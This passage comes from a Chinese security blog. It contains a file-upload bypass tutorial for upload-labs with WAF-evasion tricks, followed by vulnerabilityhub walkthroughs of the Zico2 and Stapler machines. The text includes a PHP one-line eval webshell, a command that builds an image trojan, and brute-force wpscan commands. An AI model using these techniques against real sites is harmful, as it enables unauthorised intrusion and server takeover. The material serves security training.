title="::$DATA绕过"></a>::$DATA绕过</h5><p><strong>Pass-08</strong></p><p>审计源码发现，没有使用stri_replace函数替换字符串::$DATA。</p><p><img src="/file-upload/pass8code.png" alt="image-20211025170728809"></p><p>在windows下，如果文件名+”::$DATA”，系统会把::$DATA之后的数据当成文件流处理,不会检测后缀名.且保持”::$DATA”之前的文件名。例如:phpinfo.php::$DATA，Windows会自动去掉末尾的::$DATA变成phpinfo.php。利用windows特性，可在后缀名中加” ::$DATA”绕过</p><p><img src="/file-upload/pass8s.png" alt="image-20211025170934067"></p><p>上传成功。</p><p><strong>防护措施</strong></p><p>先删除文件名末尾的::$DATA再过滤操作</p><p>对filename中的::$DATA进行匹配（已经添加规则）</p><h5 id="点加空格加点绕过"><a href="#点加空格加点绕过" class="headerlink" title="点加空格加点绕过"></a>点加空格加点绕过</h5><p><strong>Pass-09</strong></p><p>审计源码：</p><p><img src="/file-upload/pass9code.png" alt="image-20211025171317917"></p><p>这里首先会去除空格，接着删除文件名末尾的点，最后再去空。</p><p>因为最后会去空，因此文件名结尾不能为空格，可以结合点绕过进行考虑。文件名末尾为点，删除空格就加上空格，开始还会删除一个点，因此再加上点，也就是<code>. .</code>，测试：</p><p><img src="/file-upload/pass9s.png" alt="image-20211025172046926"></p><p>成功绕过过滤，上传文件。</p><p><strong>防护措施</strong></p><p>删除文件名末尾的点，空格再过滤</p><h5 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h5><p><strong>Pass-10</strong></p><p>源码：</p><p><img src="/file-upload/pass10code.png" alt="image-20211025172233670"></p><p>这里直接上传文件，成功：</p><p><img src="/file-upload/pass10t.png" alt="image-20211025172429960"></p><p>到对应目录下查看，发现文件为：</p><p><img src="/file-upload/info.png" alt="image-20211025172515208"></p><p>文件格式不对是无法进行解析的。本关中过滤思路为直接删除黑名单中的后缀名，因此双写进行绕过：</p><p><img src="/file-upload/pass10s.png" alt="image-20211025172629452"></p><p>文件格式为php，可以正常解析。</p><p><strong>防护措施</strong></p><p>对文件名的过滤使用循环过滤来替代单次过滤</p><h4 id="白名单"><a href="#白名单" class="headerlink" title="白名单"></a>白名单</h4><p>白名单验证是指只有后缀名在给定的数组中，才不会被拦截，可以进行上传。较黑名单而言，白名单验证往往更为安全。但是也有如下几类绕过方式：</p><h5 id="MIME绕过"><a href="#MIME绕过" class="headerlink" title="MIME绕过"></a>MIME绕过</h5><p><strong>Pass-02</strong></p><p>查看源码：</p><p><img src="/file-upload/pass2code.png" alt="image-20211025143831680"></p><p>先简单介绍一下$FILES函数：<br>$_FILES[myFile] [name]:客户端文件的原名称</p><p>$_FILES[myFile] [type]:文件的MIME类型</p><p>$_FILES[myFile] [size]:上传文件的大小，单位为字节</p><p>$_FILES[myFile] [tmp_name]:文件被上传后在服务端存储的临时文件名</p><p>$_FILES[myFile] [error]:和该文件上传相关的错误代码</p><p>通过源码可以发现，这里通过对MIME类型的验证进行过滤。上传文件测试：</p><p><img src="/file-upload/fail.png" alt="image-20211025144503909"></p><p>上传失败，抓包查看：</p><p><img src="/file-upload/pass2p.png" alt="image-20211025144604979"></p><p>对content-type内容进行修改：</p><p><img src="/file-upload/pass2s.png" alt="image-20211025144748487"></p><p>上传成功。</p><p>因此，单纯通过对MIME类型进行验证是很不安全的。</p><p><strong>防护措施</strong></p><p>对MIME,后缀名进行匹配验证。</p><h5 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h5><p><strong>Pass-11</strong></p><p>这里的%00截断需要与后面的00截断区分开。%00截断主要使用在地址中。</p><p>首先查看源码：</p><p><img src="/file-upload/pass11code.png" alt="image-20211025175804899"></p><p>非常典型的白名单过滤。首先抓包：</p><p><img src="/file-upload/pass11f.png" alt="image-20211025175934766"></p><p>这里发现url中带有参数save_path.结合源码发现，本关的文件，上传之后，保存到file_upload_path中，而file_upload_path由save_path,随机数和日期拼接而成。例如save_path为..&#x2F;upload，那么保存的路径就是..&#x2F;upload&#x2F;6620211025.jpg（jpg是上传的文件的后缀）。此处利用%00对后续内容进行截断，例如save_path为..&#x2F;upload&#x2F;a.php%00，正常来说保存路径应该是..&#x2F;upload&#x2F;a.php%006620211025.jpg，但是%00会将后面的随机数及日期部分丢弃，直接保存为a.php，测试：</p><p><img src="/file-upload/pass11s.png" alt="image-20211025180435295"></p><p>上传成功。</p><p>Tips:此处的文件名后缀，一定要在白名单中，不然会被拦截，即使后缀为jpg，但是截断时保存为php，依然能够被解析：</p><p><img src="/file-upload/pass11info.png" alt="image-20211025180635064"></p><p><strong>防护措施</strong></p><p>对url中的00进行匹配（已添加规则）</p><h5 id="00截断-1"><a href="#00截断-1" class="headerlink" title="00截断"></a>00截断</h5><p><strong>Pass-12</strong></p><p>源码：</p><p><img src="/file-upload/pass12code.png" alt="image-20211025205040477"></p><p>这里的提交方式由get变成了post，同样修改save_path参数的值。</p><p>注意：00截断与前文的%00截断的区别在于，%00截断主要用于地址，例如上一关所示的文件上传地址，并且get方法会自动解码%00，因此直接输入%00即可，但是post方法不会，因此需要先将其编码才能实现截断的效果。</p><p><img src="/file-upload/pass12en.png" alt="image-20211025211523737"></p><p>上传的文件名后缀为白名单中的jpg，MIME格式无需修改，将save_path加上hahaha.php%00，再使用编码功能对%00进行编码，最后发送数据包，上传成功：</p><p><img src="/file-upload/pass12s.png" alt="image-20211025211121816"></p><p>文件名为我们修改的hahaha.php，并能成功解析：</p><p><img src="/file-upload/pass12info.png" alt="image-20211025211716502"></p><p><strong>防护措施</strong></p><p>对post参数的内容进行00匹配</p><h4 id="内容及其他"><a href="#内容及其他" class="headerlink" title="内容及其他"></a>内容及其他</h4><h5 id="上传图片马配合文件包含漏洞"><a href="#上传图片马配合文件包含漏洞" class="headerlink" title="上传图片马配合文件包含漏洞"></a>上传图片马配合文件包含漏洞</h5><p>上传图片马可以用来突破getimagesize，exif_imagetype等函数，就不一一举例，原理和方法都相同，接下来以Pass-13进行说明。</p><p><strong>Pass-13</strong></p><p>图片马是指将木马插入到图片中，并且不影响图片的正常显示。</p><p>图片马的制作一般有如下几种方法：</p><ul><li>以文本方式打开图片</li></ul><p>在文件末尾直接写一句话木马。</p><ul><li>使用cmd制作木马</li></ul><p>copy aaa.jpg &#x2F;b + trojan.php &#x2F;a webshell.jpg。其中&#x2F;b是二进制形式打开，&#x2F;a是ascii方式打开，webshell.jpg是生成的图片马。这里最好把图片文件放在前面，如果反过来，不会影响效果，但是会让木马脚本出现在文件的开头，更容易被检测到。</p><ul><li>16进制打开图片插入木马</li></ul><p>使用winhex等工具打开， 在文件尾插入一句话木马。</p><ul><li>使用PS</li></ul><p>打开文件-&gt;文件简介，在标题处写入木马：</p><p><img src="/file-upload/ps.png" alt="image-20211025214635884"></p><p>这里就使用cmd制作木马，生成webshell.jpg，上传成功：</p><p><img src="/file-upload/pass13up.png" alt="image-20211025214745607"></p><p>接下来结合文件包含漏洞，执行php代码。</p><p>右键图片复制地址，并打开文件包含漏洞页面，将地址传给file参数，成功以jpg格式执行phpinfo():</p><p><img src="/file-upload/pass13s.png" alt="image-20211025214919172"></p><p><strong>防护措施</strong></p><p>在文件内容中搜索特征字符串例如&lt;?php等，对其进行匹配</p><h5 id="二次渲染"><a href="#二次渲染" class="headerlink" title="二次渲染"></a>二次渲染</h5><p><strong>Pass-17</strong></p><p>源码如下 ：</p><p><img src="/file-upload/pass17code.png" alt="image-20211025220038872"></p><p>为了将用户提交的图片进行尺寸上的更改或者适应某些内容，有时会进行二次渲染。</p><p>审计这里的代码，可以发现存在逻辑问题。首先没有进行验证，就将文件直接上传，随后将temp_file移动到upload_file，再将upload_file重命名为file_upload_path. 但是其实在开始，文件已经成功上传到了服务器，只是被重命名了无法发现，接下来进行测试：</p><p><img src="/file-upload/pass17rename.png" alt="image-20211025221931927"></p><p>将rename直接注释掉，上传文件：</p><p><img src="/file-upload/webshell.png" alt="image-20211025222114342"></p><p>可以发现文件已经被上传到了服务器。结合条件竞争的利用在下面具体讲解。</p><h5 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h5><p>还是以17关为例。上面已知，代码中先移动文件，再进行过滤，因此只需要在文件被移动之前，通过与rename进行”竞争”，并将其”占有”，就可以进行利用。</p><p>这里使用burp进行爆破来实现不断发包的目的：</p><p><img src="/file-upload/pass17brute.png" alt="image-20211025224348276"></p><p>重复发包10000次，并且不断刷新页面访问文件上传保存到的临时地址，也就是upload&#x2F;abcd.php。</p><p>会出现如下两种情况：</p><p><img src="/file-upload/pass17su.png" alt="image-20211025223249026"></p><p><img src="/file-upload/pass17fa.png" alt="image-20211025223310146"></p><p>如果为not found，就是文件已经被重命名，如果是warning或者直接解析出phpinfo()的内容就是”竞争”成功，避免了将php格式重命名为jpg等格式，可以执行所写的php脚本，连接一句话木马等等。</p><p>条件竞争典型：phpcms</p><p><strong>防护措施</strong></p><p>优化过滤的代码逻辑，先过滤再上传。</p><h5 id="文件夹绕过"><a href="#文件夹绕过" class="headerlink" title="文件夹绕过"></a>文件夹绕过</h5><p><strong>Pass-19</strong></p><p>查看源码：</p><p><img src="/file-upload/pass19code.png" alt="image-20211025225857102"></p><p>这里将上传的文件移动到file_upload_path,file_upload_path为upload&#x2F;拼接上file_name，而file_name就是我们用post提交的save_name的值。</p><p>这里用到新的思路，首先查看UI界面：</p><p><img src="/file-upload/pass19ui.png" alt="image-20211025230304838"></p><p>这里我们可以决定保存的名称，抓包：</p><p><img src="/file-upload/pass19s.png" alt="image-20211025230502806"></p><p>这里保存的名字为upload-19.php&#x2F;. 看似是文件夹的命名习惯，但是和上文的点绕过&#x2F;空格绕过类似，&#x2F;.结尾时，可以绕过黑名单过滤，不会被黑名单中的后缀所命中，成功上传后，服务器又会将&#x2F;.删除，保存为原来的格式，进行验证：</p><p><img src="/file-upload/pass19info.png" alt="image-20211025230651515"></p><p>成功绕过并能够正常解析。</p><p><strong>防护措施</strong></p><p>与空格绕过点绕过类似，可以删除文件名中的&#x2F;，也可以对filename中的&#x2F;进行匹配</p><p><strong>上文讲过的哪一种思路也能进行绕过</strong></p><h5 id="challenge"><a href="#challenge" class="headerlink" title="challenge"></a>challenge</h5><p><strong>Pass-20</strong></p><p>结合了MIME过滤，后缀名过滤，采用白名单的方式，绕过方法为逻辑数组绕过，因为在真实环境中的实用性很小，不作讲解。</p><h2 id="编辑器"><a href="#编辑器" class="headerlink" title="编辑器"></a>编辑器</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>编辑器是软体程序，一般是指用来修改电脑档案的编写软件。常见的编辑器有文本编辑器、网页编辑器、源程序编辑器、图像编辑器，声音编辑器和视频编辑器等。</p><h3 id="常见编辑器"><a href="#常见编辑器" class="headerlink" title="常见编辑器"></a>常见编辑器</h3><ul><li>FCKeditor</li><li>UEditor</li><li>eWebEditor</li><li>Cute Editor</li><li>Webhtmleditor</li><li>Kindeditor</li><li>Freetextbox</li><li>Msn editor</li></ul><h3 id="识别编辑器"><a href="#识别编辑器" class="headerlink" title="识别编辑器"></a>识别编辑器</h3><ul><li><p>inurl:fckeditor</p></li><li><p>后台看</p></li><li><p>目录扫描</p></li></ul><h3 id="编辑器漏洞利用"><a href="#编辑器漏洞利用" class="headerlink" title="编辑器漏洞利用"></a>编辑器漏洞利用</h3><p>编辑器产生的漏洞一般都是文件上传漏洞，一般没有普适性的绕过方法等，利用方法和CMS漏洞类似，需要根据已知的编辑器版本信息进行查找，如果有漏洞，就能进行利用，因此不作演示。</p><h2 id="WAF绕过（有文件上传漏洞的前提下）"><a href="#WAF绕过（有文件上传漏洞的前提下）" class="headerlink" title="WAF绕过（有文件上传漏洞的前提下）"></a>WAF绕过（有文件上传漏洞的前提下）</h2><p>目前主流的WAF大概有safedog，宝塔，D盾等等，safedog相对比较容易绕过，本次以safedog为例进行演示。实验环境为win10系统+phpstudy(Apache2.2)+safedog(Apache版)，实验的靶场为upload-labs。</p><p>WAF的绕过思路大概有两种：</p><p>1.躲过WAF的检测</p><p>2.上传其他后缀名，但是同样执行脚本内容</p><p>方法有如下几种：</p><ul><li>数据溢出-防匹配（xxx…）</li><li>符号变异-防匹配（’ “ ;）</li><li>数据截断-防匹配（%00，换行）</li><li>重复数据-防匹配（多次参数）</li></ul><h3 id="数据溢出"><a href="#数据溢出" class="headerlink" title="数据溢出"></a>数据溢出</h3><p>首先对pass-05再次进行测试。</p><p><img src="/file-upload/pass05test.jpg" alt="image-20211104092359806"></p><p>直接上传php失败，接下来测试没有安全狗的情况下可以绕过的方法：</p><p><img src="/file-upload/05phP.jpg" alt="image-20211104092514190"></p><p>大小写被安全狗拦截，接着尝试通过数据溢出来绕过安全狗。</p><p>一般情况下name属性无法进行更改，因此首先想到在filename处进行溢出。</p><p><img src="/file-upload/yichu1.jpg" alt="image-20211104093032823"></p><p>失败，被拦截，尝试更多溢出：</p><p><img src="/file-upload/yichu2.jpg" alt="image-20211104093453518"></p><p>直接没有返回，失败。经过测试，如果继续加大溢出的字符，会导致apache服务直接崩溃。</p><p>Tips:这里在filename中进行溢出尝试时候，pass-06成功上传了php文件：</p><p><img src="/file-upload/pass061.jpg" alt="image-20211104101741140"></p><p>因此，针对不同的过滤方法，就数据溢出形式的绕过而言，对filename进行溢出可能是一种可行的方法。</p><p>接着尝试在两个属性之间溢出：</p><p><img src="/file-upload/yichu3.jpg" alt="image-20211104094059729"></p><p>可以绕过安全狗，但是无法上传，提示上传出错。</p><p>接下来模仿报文的格式，在溢出的数据后加”;” :</p><p><img src="/file-upload/pass062.jpg" alt="image-20211104101947942"></p><p>可以成功绕过安全狗限制。</p><p>Tips:如果溢出的数据不够，可能还会被拦截，加大溢出数据的长度即可。经过测试，不止在name,filename处可以成功，其他属性直接插入垃圾数据并使用”;”分隔也有同样的效果。</p><h3 id="符号变异"><a href="#符号变异" class="headerlink" title="符号变异"></a>符号变异</h3><p>首先对正常php进行测试，被安全狗拦截：</p><p><img src="/file-upload/pass021.jpg" alt="image-20211104124300312"></p><p>符号变异的绕过主要就是通过对<code>&#39; &quot; ;   </code>等符号进行测试。接下来依次尝试：</p><p>从报文可以看出，filename到content-type中间没有分号，而是一个换行，尝试添加分号：</p><p><img src="/file-upload/test022.jpg" alt="image-20211104124615589"></p><p>绕过失败，被拦截。</p><p>尝试删除一个后面的引号：</p><p><img src="/file-upload/pass023.jpg" alt="test023"></p><p>成功绕过安全狗上传文件,到目录下查看，正常：</p><p><img src="/file-upload/server1.jpg" alt="image-20211104125154265"></p><p>尝试删除前面的引号：</p><p><img src="/file-upload/pass024.jpg" alt="image-20211104125241961"></p><p>被拦截。这里引号的位置不同，导致拦截行为有差异，可能跟安全狗的安全策略有关。</p><p>接下来考虑用单引号替换双引号，测试方法相同就不再重复。结果如下：</p><p><img src="/file-upload/webshell.jpg" alt="image-20211104125535150"></p><p>如果没有单引号、只有一个单引号或者有一个闭合的单引号，全部都能绕过检测成功上传文件。</p><p>Tips:上述单引号的四种绕过中，第二种会上传后缀名为php’的文件，无法执行</p><p>另外可以尝试filename&#x3D;”x”a.php。有一定几率绕过，上传的文件名为a.php。如果直接写”x”.php，则文件名为.php,也能执行。</p><h3 id="数据截断"><a href="#数据截断" class="headerlink" title="数据截断"></a>数据截断</h3><p>尝试之前试过的00截断，在post中，因此需要进行url编码：</p><p><img src="/file-upload/00.jpg" alt="image-20211104132010892"></p><p>直接绕过了安全狗。查看服务器中的文件，为a.php:</p><p><img src="/file-upload/server2.jpg" alt="image-20211104132106720"></p><p>接着通过分号进行截断，这里主要是利用了白名单，让检测时误以为是白名单中的内容：</p><p><img src="/file-upload/white.jpg" alt="image-20211104132231286"></p><p>成功绕过安全狗，注意，虽然有.jpg ; 但是文件最终还是php文件。</p><p>Tips:利用数据截断进行上传时，还可以考虑::$DATA截断，换行截断。</p><p>换行截断是指：</p><p><img src="/file-upload/0d.jpg" alt="image-20211104135213671"></p><p>也有一定的几率能够绕过。</p><h3 id="重复数据-防匹配"><a href="#重复数据-防匹配" class="headerlink" title="重复数据-防匹配"></a>重复数据-防匹配</h3><p>这里通过使用重复数据进行绕过，上传的最终文件是最后一个，因此前面重复添加jpg来绕过：</p><p><img src="/file-upload/shell.jpg" alt="image-20211104133636071"></p><p>成功，到服务器进行验证：</p><p><img src="/file-upload/hahaha.jpg" alt="image-20211104133806292"></p><p>上传了名为hahaha.php的文件。</p><p>尝试在filename中加入重复数据：</p><p><img src="/file-upload/jpegaaa.jpg" alt="image-20211104134353518"></p><p>这里将name，content-type的内容添加到filename中，绕过了安全狗，查看上传的文件名：</p><p><img src="/file-upload/content.jpg" alt="image-20211104134444896"></p><p>发现文件名闻jpegaaaaa.php，观察报文发现新的思路，是否可以直接使用&#x2F;绕过？</p><p>进行测试：</p><p><img src="/file-upload/test.jpg" alt="image-20211104134940506"></p><p>发现被过滤，将aaa替换成更长的字符串依然失败。再结合报文，可能需要引号闭合，进行测试：</p><p><img src="/file-upload/final.jpg" alt="image-20211104134902898"></p><p>成功绕过，查看服务器中的文件名：</p><p><img src="/file-upload/suc.jpg" alt="image-20211104135052079"></p><p>与猜想的一致，成功。</p><h3 id="fuzz"><a href="#fuzz" class="headerlink" title="fuzz"></a>fuzz</h3><p>在不了解黑白名单内容的情况下，可以通过fuzz测试来进行尝试。</p><p>还是以upload-labs为例，假设只针对php文件。</p><p>对filename的内容进行爆破，使用fuzz字典，结果如下：</p><p><img src="/file-upload/render.jpg" alt="image-20211104135715164"></p><p>是否能通过检测可以通过render查看，此处直接从服务器上更直观地来看：</p><p><img src="/file-upload/server4.jpg" alt="image-20211104135831748"></p><p>上传的都是绕过了黑白名单限制的后缀。</p><p>Tips：对网站爆破可能会被封锁IP，可以通过burp的fakeip插件或者动态ip进行一定程度的缓解。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>WAF的绕过方法有很多种，但是思路大致就是上文提到的内容，将各种方法结合使用往往就能对WAF进行有效地绕过。</p><h3 id="防护"><a href="#防护" class="headerlink" title="防护"></a>防护</h3><ul><li>对于垃圾数据填充，可以通过content!进行一定程度的防御</li><li>限制上传文件名的最大长度</li><li>对<code>; &#39; &quot; /</code>等特殊字符进行限制</li><li>对文件名中的00进行匹配</li></ul><h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><ul><li>看中间件，看是否存在解析漏洞&#x2F;CMS&#x2F;编辑器漏洞&#x2F;CVE&#x2F;漏洞。如果有，搜索对应的利用方法。</li><li>查找文件上传点，找到后，先上传普通的文件进行测试，筛选，接着对过滤方法进行猜测，针对不同的过滤采用不同的绕过方法。</li></ul><h3 id="CMS"><a href="#CMS" class="headerlink" title="CMS"></a>CMS</h3><p>识别方法：</p><ul><li>云悉</li><li>whatweb</li><li>御剑识别</li><li>文件md5值</li><li>F12数据包</li><li>robots.txt</li></ul><h3 id="编辑器-1"><a href="#编辑器-1" class="headerlink" title="编辑器"></a>编辑器</h3><ul><li>通过url或者UI界面内容进行识别</li></ul><h3 id="其他-CVE"><a href="#其他-CVE" class="headerlink" title="其他&#x2F;CVE"></a>其他&#x2F;CVE</h3><ul><li>关注CVE官网，漏洞库等</li></ul>]]></content>
    
    
    <categories>
      
      <category>OWASP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>file upload</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulnhub_Zico2</title>
    <link href="/2023/04/26/vulnhub-Zico2/"/>
    <url>/2023/04/26/vulnhub-Zico2/</url>
    
    <content type="html"><![CDATA[<h1 id="vulnhub-Zico2"><a href="#vulnhub-Zico2" class="headerlink" title="vulnhub_Zico2"></a>vulnhub_Zico2</h1><p>arp-scan+masscan扫端口：</p><p><img src="/2023/04/27/file-upload/2/image-20230309085304660.png" alt="image-20230309085304660"></p><p>nmap扫服务：</p><p><img src="/2023/04/27/file-upload/2/image-20230309085425386.png" alt="image-20230309085425386"></p><p>开放了22，80，111，50670等端口。</p><p>尝试ssh弱口令，失败：</p><p><img src="/2023/04/27/file-upload/2/image-20230309091310662.png" alt="image-20230309091310662"></p><p>访问80端口的http服务：</p><p><img src="/2023/04/27/file-upload/2/image-20230309091518406.png" alt="image-20230309091518406"></p><p>点击各类功能点，发现如下页面，page&#x3D;xxx:</p><p><img src="/2023/04/27/file-upload/2/image-20230309091602675.png" alt="image-20230309091602675"></p><p>尝试本地文件包含，存在漏洞：</p><p><img src="/2023/04/27/file-upload/2/image-20230309091624462.png" alt="image-20230309091624462"></p><p>dirsearch爆破后台目录：</p><p><img src="/2023/04/27/file-upload/2/image-20230309091822847.png" alt="image-20230309091822847"></p><p>发现&#x2F;dbadmin，访问路径：</p><p><img src="/2023/04/27/file-upload/2/image-20230309091837154.png" alt="image-20230309091837154"></p><p>发现phpliteadmin，尝试弱口令admin：</p><p><img src="/2023/04/27/file-upload/2/image-20230309095117322.png" alt="image-20230309095117322"></p><p>登录成功：</p><p><img src="/2023/04/27/file-upload/2/image-20230309095224609.png" alt="image-20230309095224609"></p><p>首先想到查询数据，选择csv格式导出：</p><p><img src="/2023/04/27/file-upload/2/image-20230309095355218.png" alt="image-20230309095355218"></p><p>发现root和zico两个用户。</p><p><img src="/2023/04/27/file-upload/2/image-20230309095433457.png" alt="image-20230309095433457"></p><p>md5解密：</p><p><img src="/2023/04/27/file-upload/2/image-20230309095517231.png" alt="image-20230309095517231"></p><p>直接ssh登录root&#x2F;34root34，失败。</p><p>尝试寻找phpliteadmin漏洞，使用searchsploit搜索：</p><p><img src="/2023/04/27/file-upload/2/image-20230309095627928.png" alt="image-20230309095627928"></p><p>存在代码注入漏洞，根据提示，需要新建数据库，新建表，就能执行php代码。</p><p><img src="/2023/04/27/file-upload/2/image-20230309095639243.png" alt="image-20230309095639243"></p><p>创建表，插入一条数据<code>&lt;?php @eval($_POST[cmd]); ?&gt;</code></p><p><img src="/2023/04/27/file-upload/2/image-20230309100008129.png" alt="image-20230309100008129"></p><p>成功写入，再配合前面的本地文件包含，直接getshell，连上蚁剑。</p><p><img src="/2023/04/27/file-upload/2/image-20230309100225528.png" alt="image-20230309100225528"></p><p>在home下，查找zico相关文件，发现wp配置，存在用户名密码。</p><p><img src="/2023/04/27/file-upload/2/image-20230309100615572.png" alt="image-20230309100615572"></p><p>弹shell到kali，生成交互shell，su zico，切换到zico用户：</p><p><img src="/2023/04/27/file-upload/2/image-20230309100803138.png" alt="image-20230309100803138"></p><p>sudo -l，发现tar，zip，直接提权到root。</p>]]></content>
    
    
    <categories>
      
      <category>vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vulnhub</tag>
      
      <tag>walkthrough</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulnhub_Stapler</title>
    <link href="/2023/04/26/vulnhub-Stapler/"/>
    <url>/2023/04/26/vulnhub-Stapler/</url>
    
    <content type="html"><![CDATA[<h1 id="Stapler"><a href="#Stapler" class="headerlink" title="Stapler"></a>Stapler</h1><p>arp-scan发现目标主机：</p><p><img src="/2023/04/27/file-upload/ler/image-20230307232914512.png" alt="image-20230307232914512"></p><p>masscan全端口扫描：</p><p><img src="/2023/04/27/file-upload/ler/image-20230307232942455.png" alt="image-20230307232942455"></p><p>nmap详细扫描：</p><p><img src="/2023/04/27/file-upload/ler/image-20230307233921356.png" alt="image-20230307233921356"></p><p><img src="/2023/04/27/file-upload/ler/image-20230307233945813.png" alt="image-20230307233945813"></p><p>开放了ftp,ssh,mysql,smb,http等服务。</p><p>ftp允许匿名登录：</p><p><img src="/2023/04/27/file-upload/ler/image-20230307234331021.png" alt="image-20230307234331021"></p><p>查看note文件内容:</p><p><img src="/2023/04/27/file-upload/ler/image-20230307234345835.png" alt="image-20230307234345835"></p><p>这里提到一些用户名：Harry,Jojn,Elly.</p><p>ssh连接：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308151213643.png" alt="image-20230308151213643"></p><p>新的用户名Barry。</p><p>尝试弱口令失败，暂时跳过。</p><p>enum4linux可以发现一些用户信息：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308171948892.png" alt="image-20230308171948892"></p><p>对于smb协议，查看共享文件夹：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308171639530.png" alt="image-20230308171639530"></p><p>可以访问kathy和tmp目录，均无有效信息：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308171722902.png" alt="image-20230308171722902"></p><p>666端口服务为止，直接nc：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308151340275.png" alt="image-20230308151340275"></p><p>可以看到message2.jpg。</p><p>接收文件并保存：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308151442195.png" alt="image-20230308151442195"></p><p>发现为zip文件，改名解压：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308151514679.png" alt="image-20230308151514679"></p><p>新用户名Scott.</p><p>收集到以上用户名之后尝试进行ssh和ftp服务的爆破。</p><p><img src="/2023/04/27/file-upload/ler/image-20230308160218674.png" alt="image-20230308160218674"></p><p>ssh爆破失败，但是ftp爆破出elly&#x2F;ylle，登录后并无有用信息。</p><p>接下来把重点放在80和12380端口的http服务。</p><p>先看80：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308085447584.png" alt="image-20230308085447584"></p><p><img src="/2023/04/27/file-upload/ler/image-20230308085437715.png" alt="image-20230308085437715"></p><p>这里有两个配置文件，.bashrc和.profile，先下载到本地。</p><p><img src="/2023/04/27/file-upload/ler/image-20230308085713209.png" alt="image-20230308085713209"></p><p>无有用信息。</p><p>接下来尝试访问12380：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308091700598.png" alt="image-20230308091700598"></p><p>无任何有效信息，访问robots.txt等目录，不发生跳转，返回400：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308091802471.png" alt="image-20230308091802471"></p><p>nikto扫描：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308091905800.png" alt="image-20230308091905800"></p><p>这里提到了&#x2F;admin112233,&#x2F;blogblog等目录，但是http访问后依然为400，nikto显示有ssl信息，使用https:</p><p><img src="/2023/04/27/file-upload/ler/image-20230308092714929.png" alt="image-20230308092714929"></p><p>出现不同的页面。</p><p><img src="/2023/04/27/file-upload/ler/image-20230308092737735.png" alt="image-20230308092737735"></p><p>admin112233为xss页面。</p><p><img src="/2023/04/27/file-upload/ler/image-20230308092803364.png" alt="image-20230308092803364"></p><p>blogblog为博客页面。对该目录进行爆破：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308093300771.png" alt="image-20230308093300771"></p><p>明显为wordpress框架。</p><p>上wpscan：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308093434748.png" alt="image-20230308093434748"></p><p>提示SSL peer certificate or SSH remote key was not OK,可能是ssl证书有问题，disable：</p><p><code>wpscan --url https://192.168.59.19:12380/blogblog --disable-tls-checks</code></p><p><img src="/2023/04/27/file-upload/ler/image-20230308093703854.png" alt="image-20230308093703854"></p><p>问题解决。</p><p>扫一下用户名：</p><p><code>wpscan --url https://192.168.59.19:12380/blogblog --disable-tls-checks --enumerate u</code></p><p><img src="/2023/04/27/file-upload/ler/image-20230308160754290.png" alt="image-20230308160754290"></p><p>枚举出用户名后，直接大字典爆破密码：</p><p><code>wpscan --url https://192.168.59.19:12380/blogblog --disable-tls-checks -eu -P /usr/share/wordlists/rockyou.txt</code></p><p><img src="/2023/04/27/file-upload/ler/image-20230308161305127.png" alt="image-20230308161305127"></p><p>用得到的账号登录：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308161505638.png" alt="image-20230308161505638"></p><p>普通用户权限，非管理员，暂时跳过。</p><p>回到wpscan，对wordpress插件进行扫描，尝试利用插件漏洞，默认为被动扫描，要发现全部插件这里使用主动扫描，ap代表all plugins：</p><p><code>wpscan --url https://192.168.59.19:12380/blogblog --disable-tls-checks --enumerate ap --plugins-detection aggressive</code></p><p><img src="/2023/04/27/file-upload/ler/image-20230308161957394.png" alt="image-20230308161957394"></p><p>扫出了图中部分插件。经过尝试，advanced-video-embed-embed-videos-or-playlists存在漏洞。</p><p><img src="/2023/04/27/file-upload/ler/image-20230308162206276.png" alt="image-20230308162206276"></p><p>在EDB中寻找poc，查看python文件：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308162257243.png" alt="image-20230308162257243"></p><p>这里修改url为靶机的地址，运行报错：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308162346333.png" alt="image-20230308162346333"></p><p>修改poc，导入ssl，并且加上<code>ssl._create_default_https_context = ssl._create_unverified_context</code></p><p>再次运行，无回显。</p><p><img src="/2023/04/27/file-upload/ler/image-20230308162534743.png" alt="image-20230308162534743"></p><p>此时查看登录后的主页，发现出现了.jpg：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308163901154.png" alt="image-20230308163901154"></p><p>尝试直接访问poc中的url：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308163949595.png" alt="image-20230308163949595"></p><p>访问提示页面后出现404。</p><p>尝试访问jpeg文件，wordpress中一般存在&#x2F;wp-content&#x2F;uploads文件夹，访问后发现jpeg文件。</p><p><img src="/2023/04/27/file-upload/ler/image-20230308164229282.png" alt="image-20230308164229282"></p><p>直接wget下载文件：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308164423023.png" alt="image-20230308164423023"></p><p>ssl证书有问题，加上参数–no-check-certificate后解决。</p><p>查看文件内容：<br><img src="/2023/04/27/file-upload/ler/image-20230308164459634.png" alt="image-20230308164459634"></p><p>jpeg文件内容为config文件，包含了数据库配置信息。</p><p>直接登录数据库，找到用户表：</p><p><img src="/2023/04/27/file-upload/ler/image-20230308164621458.png" alt="image-20230308164621458"></p><p>注意John用户存在user_url，可能为管理员权限。</p><p>将用户名密码简单处理后如下：<br><img 